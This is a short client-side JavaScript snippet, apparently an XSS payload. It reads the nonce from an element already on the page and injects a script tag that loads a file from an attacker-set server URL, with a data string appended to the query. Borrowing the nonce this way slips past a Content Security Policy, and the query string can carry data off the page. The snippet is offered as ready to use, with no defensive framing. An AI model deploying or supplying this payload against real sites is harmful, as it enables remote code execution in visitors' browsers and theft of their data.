// use this on the client side

let serverURL = '' //make sure to include '/' at the end
let data = ''
let sampleFile = 'sample.js'
document.body.appendChild(Object.assign(document.createElement("script"), {
  src: serverURL + sampleFile + '?' + data,
  nonce: document.querySelector("[nonce]").nonce,
  onerror: console.error
}))
